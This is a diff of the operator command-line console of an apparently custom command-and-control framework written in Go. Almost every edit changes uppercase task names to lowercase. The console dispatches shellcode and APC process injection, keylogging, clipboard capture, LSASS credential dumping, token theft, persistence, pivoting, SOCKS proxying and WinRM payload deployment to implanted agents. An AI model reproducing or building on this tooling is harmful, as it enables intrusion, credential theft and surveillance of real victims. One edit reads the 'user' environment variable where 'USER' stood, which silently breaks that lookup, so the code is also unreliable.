@@ -82,7 +82,7 @@ type CLI struct {
 }
 
 func NewCLI(c *Client) *CLI {
-	op := os.Getenv("USER")
+	op := os.Getenv("user")
 	if op == "" {
 		op = "operator"
 	}
@@ -227,7 +227,7 @@ func (cl *CLI) dispatch(parts []string) {
 			warn("usage: shell <command>")
 			return
 		}
-		cl.cmdTask(cl.current, "SHELL", strings.Join(parts[1:], " "), nil)
+		cl.cmdTask(cl.current, "shell", strings.Join(parts[1:], " "), nil)
 
 	case "sleep":
 		if cl.requireAgent(); cl.current == "" {
@@ -245,7 +245,7 @@ func (cl *CLI) dispatch(parts []string) {
 		}
 		argBytes, _ := json.Marshal(map[string]int{"sec": secVal, "jitter": jitterVal})
 		args := string(argBytes)
-		cl.cmdTask(cl.current, "SLEEP", args, nil)
+		cl.cmdTask(cl.current, "sleep", args, nil)
 
 	case "download":
 		if cl.requireAgent(); cl.current == "" {
@@ -255,7 +255,7 @@ func (cl *CLI) dispatch(parts []string) {
 			warn("usage: download <remote_path>")
 			return
 		}
-		cl.cmdTask(cl.current, "DOWNLOAD", fmt.Sprintf(`{"path":%q}`, parts[1]), nil)
+		cl.cmdTask(cl.current, "download", fmt.Sprintf(`{"path":%q}`, parts[1]), nil)
 
 	case "upload":
 		if cl.requireAgent(); cl.current == "" {
@@ -271,7 +271,7 @@ func (cl *CLI) dispatch(parts []string) {
 			return
 		}
 		args := fmt.Sprintf(`{"filename":%q,"remote_path":%q}`, filepath.Base(parts[1]), parts[2])
-		cl.cmdTask(cl.current, "UPLOAD", args, data)
+		cl.cmdTask(cl.current, "upload", args, data)
 
 	case "stage2":
 		if cl.requireAgent(); cl.current == "" {
@@ -286,7 +286,7 @@ func (cl *CLI) dispatch(parts []string) {
 			errLine("reading shellcode: %s", err)
 			return
 		}
-		cl.cmdTask(cl.current, "STAGE2", "", sc)
+		cl.cmdTask(cl.current, "stage2", "", sc)
 
 	case "bof":
 		if len(parts) > 1 && parts[1] == "install" {
@@ -306,7 +306,7 @@ func (cl *CLI) dispatch(parts []string) {
 		if cl.requireAgent(); cl.current == "" {
 			return
 		}
-		cl.cmdTask(cl.current, "PWD", "", nil)
+		cl.cmdTask(cl.current, "pwd", "", nil)
 
 	case "cd":
 		if cl.requireAgent(); cl.current == "" {
@@ -336,7 +336,7 @@ func (cl *CLI) dispatch(parts []string) {
 			warn("usage: mkdir <path>")
 			return
 		}
-		cl.cmdTask(cl.current, "MKDIR", strings.Join(parts[1:], " "), nil)
+		cl.cmdTask(cl.current, "mkdir", strings.Join(parts[1:], " "), nil)
 
 	case "rm":
 		if cl.requireAgent(); cl.current == "" {
@@ -352,7 +352,7 @@ func (cl *CLI) dispatch(parts []string) {
 		if cl.requireAgent(); cl.current == "" {
 			return
 		}
-		cl.cmdTask(cl.current, "ENV", "", nil)
+		cl.cmdTask(cl.current, "env", "", nil)
 
 	case "cat":
 		if cl.requireAgent(); cl.current == "" {
@@ -362,7 +362,7 @@ func (cl *CLI) dispatch(parts []string) {
 			warn("usage: cat <path>")
 			return
 		}
-		cl.cmdTask(cl.current, "CAT", strings.Join(parts[1:], " "), nil)
+		cl.cmdTask(cl.current, "cat", strings.Join(parts[1:], " "), nil)
 
 	case "ps":
 		if cl.requireAgent(); cl.current == "" {
@@ -374,7 +374,7 @@ func (cl *CLI) dispatch(parts []string) {
 		if cl.requireAgent(); cl.current == "" {
 			return
 		}
-		cl.cmdTask(cl.current, "SCREENSHOT", "", nil)
+		cl.cmdTask(cl.current, "screenshot", "", nil)
 
 	case "inject":
 		if cl.requireAgent(); cl.current == "" {
@@ -389,7 +389,7 @@ func (cl *CLI) dispatch(parts []string) {
 			errLine("%s", err)
 			return
 		}
-		cl.cmdTask(cl.current, "INJECT_REMOTE", parts[1], sc)
+		cl.cmdTask(cl.current, "inject_remote", parts[1], sc)
 
 	case "token":
 		if cl.requireAgent(); cl.current == "" {
@@ -417,7 +417,7 @@ func (cl *CLI) dispatch(parts []string) {
 		var confirm string
 		fmt.Scanln(&confirm)
 		if strings.ToLower(confirm) == "y" {
-			cl.cmdTask(cl.current, "CLEANUP", "", nil)
+			cl.cmdTask(cl.current, "cleanup", "", nil)
 			cl.current = ""
 		}
 
@@ -756,7 +756,7 @@ func (cl *CLI) cmdAgents() {
 		return
 	}
 	fmt.Printf(cBold+"%-36s  %-15s  %-20s  %-15s  %-8s  %s\n"+cReset,
-		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "STATUS")
+		"ID", "hostname", "user", "IP", "transp", "status")
 	fmt.Println(cDim + strings.Repeat("─", 110) + cReset)
 	for _, a := range agents {
 		var status string
@@ -789,7 +789,7 @@ func (cl *CLI) cmdInfo(id string) {
 		kv("User", a.Username),
 		kv("OS", a.OS),
 		kv("IP", a.IP),
-		kv("PID", fmt.Sprintf("%d", a.PID)),
+		kv("pid", fmt.Sprintf("%d", a.PID)),
 		kv("Transport", a.Transport),
 		kv("Sleep", fmt.Sprintf("%ds ±%d%%", a.SleepSec, a.JitterPct)),
 		kv("Last seen", a.LastSeen.Format(time.RFC3339)),
@@ -854,7 +854,7 @@ func (cl *CLI) cmdJobs() {
 		info("no listeners running")
 		return
 	}
-	fmt.Printf(cBold+"%-4s  %-10s  %-6s  %-12s  %s\n"+cReset, "ID", "PROTO", "PORT", "STATUS", "UPTIME")
+	fmt.Printf(cBold+"%-4s  %-10s  %-6s  %-12s  %s\n"+cReset, "ID", "proto", "port", "status", "uptime")
 	fmt.Println(cDim + strings.Repeat("─", 50) + cReset)
 	for _, j := range jobs {
 		uptime := time.Since(j.StartedAt).Round(time.Second).String()
@@ -1265,7 +1265,7 @@ func (cl *CLI) cmdPersist(args []string) {
 	method := args[0]
 	if method == "enum" || method == "check" || method == "list" {
 		argJSON, _ := json.Marshal(map[string]string{"method": method})
-		cl.cmdTask(cl.current, "PERSIST", string(argJSON), nil)
+		cl.cmdTask(cl.current, "persist", string(argJSON), nil)
 		return
 	}
 	if len(args) < 2 {
@@ -1278,7 +1278,7 @@ func (cl *CLI) cmdPersist(args []string) {
 		name = args[2]
 	}
 	argJSON, _ := json.Marshal(map[string]string{"method": method, "cmd": cmd, "name": name})
-	cl.cmdTask(cl.current, "PERSIST", string(argJSON), nil)
+	cl.cmdTask(cl.current, "persist", string(argJSON), nil)
 }
 
 // ── fork & run ────────────────────────────────────────────────────────────
@@ -1312,7 +1312,7 @@ func (cl *CLI) cmdForkRun(args []string) {
 		return
 	}
 	encoded := base64.StdEncoding.EncodeToString(data)
-	cl.cmdTask(cl.current, "FORK_RUN", process, []byte(encoded))
+	cl.cmdTask(cl.current, "fork_run", process, []byte(encoded))
 }
 
 // ── early-bird APC injection ──────────────────────────────────────────────
@@ -1344,7 +1344,7 @@ func (cl *CLI) cmdInjectAPC(args []string) {
 		process = args[1]
 	}
 	encoded := base64.StdEncoding.EncodeToString(data)
-	cl.cmdTask(cl.current, "INJECT_APC", process, []byte(encoded))
+	cl.cmdTask(cl.current, "inject_apc", process, []byte(encoded))
 }
 
 // ── execute assembly ──────────────────────────────────────────────────────
@@ -1383,7 +1383,7 @@ func (cl *CLI) cmdExecAsm(args []string) {
 		process = args[1]
 	}
 	encoded := base64.StdEncoding.EncodeToString(sc)
-	cl.cmdTask(cl.current, "FORK_RUN", process, []byte(encoded))
+	cl.cmdTask(cl.current, "fork_run", process, []byte(encoded))
 }
 
 // ── dotnet-exec (native CLR host, in-process) ────────────────────────────
@@ -1462,7 +1462,7 @@ func (cl *CLI) cmdExecDotnet(args []string) {
 		asmB64, strings.Join(asmArgs, " "), typeName, methodName)
 
 	info("dotnet-exec: %s%s%s (%d bytes) → in-process CLR", cBCyan, filepath.Base(asmPath), cReset, len(data))
-	cl.cmdTask(cl.current, "DOTNET_EXEC", taskArgs, nil)
+	cl.cmdTask(cl.current, "dotnet_exec", taskArgs, nil)
 }
 
 // ── keylogger ─────────────────────────────────────────────────────────────
@@ -1480,11 +1480,11 @@ func (cl *CLI) cmdKeylog(args []string) {
 	}
 	switch args[0] {
 	case "start":
-		cl.cmdTask(cl.current, "KEYLOG_START", "", nil)
+		cl.cmdTask(cl.current, "keylog_start", "", nil)
 	case "stop":
-		cl.cmdTask(cl.current, "KEYLOG_STOP", "", nil)
+		cl.cmdTask(cl.current, "keylog_stop", "", nil)
 	case "dump":
-		cl.cmdTask(cl.current, "KEYLOG_DUMP", "", nil)
+		cl.cmdTask(cl.current, "keylog_dump", "", nil)
 	default:
 		fmt.Println(keylogUsage)
 	}
@@ -1493,7 +1493,7 @@ func (cl *CLI) cmdKeylog(args []string) {
 // ── clipboard ─────────────────────────────────────────────────────────────
 
 func (cl *CLI) cmdClip() {
-	cl.cmdTask(cl.current, "CLIP_GET", "", nil)
+	cl.cmdTask(cl.current, "clip_get", "", nil)
 }
 
 // ── LSASS minidump ────────────────────────────────────────────────────────
@@ -1514,7 +1514,7 @@ func (cl *CLI) cmdMinidump(args []string) {
 	if len(args) > 0 {
 		pid = args[0]
 	}
-	cl.cmdTask(cl.current, "MINIDUMP", pid, nil)
+	cl.cmdTask(cl.current, "minidump", pid, nil)
 }
 
 // ── Port scan ─────────────────────────────────────────────────────────────
@@ -1550,7 +1550,7 @@ func (cl *CLI) cmdPortScan(args []string) {
 		return
 	}
 	taskArgs := strings.Join(args, " ")
-	cl.cmdTask(cl.current, "PORT_SCAN", taskArgs, nil)
+	cl.cmdTask(cl.current, "port_scan", taskArgs, nil)
 }
 
 // ── SMB named pipe pivot server ───────────────────────────────────────────
@@ -1586,9 +1586,9 @@ func (cl *CLI) cmdLink(args []string) {
 		if len(args) >= 2 {
 			pipeName = args[1]
 		}
-		cl.cmdTask(cl.current, "PIPE_START", pipeName, nil)
+		cl.cmdTask(cl.current, "pipe_start", pipeName, nil)
 	case "stop":
-		cl.cmdTask(cl.current, "PIPE_STOP", "", nil)
+		cl.cmdTask(cl.current, "pipe_stop", "", nil)
 	default:
 		fmt.Println(linkUsage)
 	}
@@ -1688,9 +1688,9 @@ func (cl *CLI) cmdHTTPivot(args []string) {
 		if len(args) >= 2 {
 			port = args[1]
 		}
-		cl.cmdTask(cl.current, "HTTP_PIVOT_START", port, nil)
+		cl.cmdTask(cl.current, "http_pivot_start", port, nil)
 	case "stop":
-		cl.cmdTask(cl.current, "HTTP_PIVOT_STOP", "", nil)
+		cl.cmdTask(cl.current, "http_pivot_stop", "", nil)
 	default:
 		fmt.Println(httpivotUsage)
 	}
@@ -1728,12 +1728,12 @@ func (cl *CLI) cmdWinRM(args []string) {
 		argJSON, _ := json.Marshal(map[string]string{
 			"target": target, "user": user, "pass": pass, "cmd": rest,
 		})
-		cl.cmdTask(cl.current, "WINRM_EXEC", string(argJSON), nil)
+		cl.cmdTask(cl.current, "winrm_exec", string(argJSON), nil)
 	case "deploy":
 		argJSON, _ := json.Marshal(map[string]string{
 			"target": target, "user": user, "pass": pass, "payload": rest,
 		})
-		cl.cmdTask(cl.current, "WINRM_DEPLOY", string(argJSON), nil)
+		cl.cmdTask(cl.current, "winrm_deploy", string(argJSON), nil)
 	default:
 		fmt.Print(winrmUsage)
 	}
@@ -1780,7 +1780,7 @@ func (cl *CLI) cmdRole(args []string) {
 			info("(no roles assigned — all default to 'operator')")
 			return
 		}
-		fmt.Printf("\n  "+cBold+"%-25s  %s\n"+cReset, "OPERATOR", "ROLE")
+		fmt.Printf("\n  "+cBold+"%-25s  %s\n"+cReset, "operator", "role")
 		fmt.Println("  " + cDim + strings.Repeat("─", 40) + cReset)
 		for op, role := range roles {
 			var rc string
@@ -1827,21 +1827,21 @@ func (cl *CLI) cmdToken(args []string) {
 	}
 	switch args[0] {
 	case "whoami":
-		cl.cmdTask(cl.current, "TOKEN_WHOAMI", "", nil)
+		cl.cmdTask(cl.current, "token_whoami", "", nil)
 	case "steal":
 		if len(args) < 2 {
 			fmt.Println("usage: token steal <pid>")
 			return
 		}
-		cl.cmdTask(cl.current, "TOKEN_STEAL", args[1], nil)
+		cl.cmdTask(cl.current, "token_steal", args[1], nil)
 	case "make":
 		if len(args) < 3 {
 			fmt.Println(`usage: token make <domain\user> <pass>`)
 			return
 		}
-		cl.cmdTask(cl.current, "TOKEN_MAKE", args[1]+" "+args[2], nil)
+		cl.cmdTask(cl.current, "token_make", args[1]+" "+args[2], nil)
 	case "drop":
-		cl.cmdTask(cl.current, "TOKEN_DROP", "", nil)
+		cl.cmdTask(cl.current, "token_drop", "", nil)
 	default:
 		fmt.Println("unknown token subcommand:", args[0])
 	}
@@ -1854,13 +1854,13 @@ func (cl *CLI) cmdSocks(args []string) {
 	}
 	switch args[0] {
 	case "stop":
-		cl.cmdTask(cl.current, "SOCKS_STOP", "", nil)
+		cl.cmdTask(cl.current, "socks_stop", "", nil)
 	default:
 		taskArgs := args[0]
 		if len(args) >= 2 {
 			taskArgs += " " + args[1]
 		}
-		cl.cmdTask(cl.current, "SOCKS_START", taskArgs, nil)
+		cl.cmdTask(cl.current, "socks_start", taskArgs, nil)
 	}
 }
 
@@ -1879,15 +1879,15 @@ func (cl *CLI) cmdPortFwd(args []string) {
 			fmt.Println("usage: portfwd add <lport> <rhost> <rport>")
 			return
 		}
-		cl.cmdTask(cl.current, "PORTFWD_ADD", strings.Join(args[1:4], " "), nil)
+		cl.cmdTask(cl.current, "portfwd_add", strings.Join(args[1:4], " "), nil)
 	case "del":
 		if len(args) < 2 {
 			fmt.Println("usage: portfwd del <lport>")
 			return
 		}
-		cl.cmdTask(cl.current, "PORTFWD_DEL", args[1], nil)
+		cl.cmdTask(cl.current, "portfwd_del", args[1], nil)
 	case "list":
-		cl.cmdTask(cl.current, "PORTFWD_LIST", "", nil)
+		cl.cmdTask(cl.current, "portfwd_list", "", nil)
 	default:
 		fmt.Println("unknown portfwd subcommand:", args[0])
 	}
@@ -1970,10 +1970,10 @@ examples:
 			"coff_b64": base64.StdEncoding.EncodeToString(coffData),
 			"args_b64": argsB64,
 		})
-		cl.cmdTask(cl.current, "BOF", string(wire), nil)
+		cl.cmdTask(cl.current, "bof", string(wire), nil)
 		return
 	}
-	cl.cmdTask(cl.current, "BOF", argsB64, coffData)
+	cl.cmdTask(cl.current, "bof", argsB64, coffData)
 }
 
 // packBOFArg packs one "value:type" argument into the beacon data format.
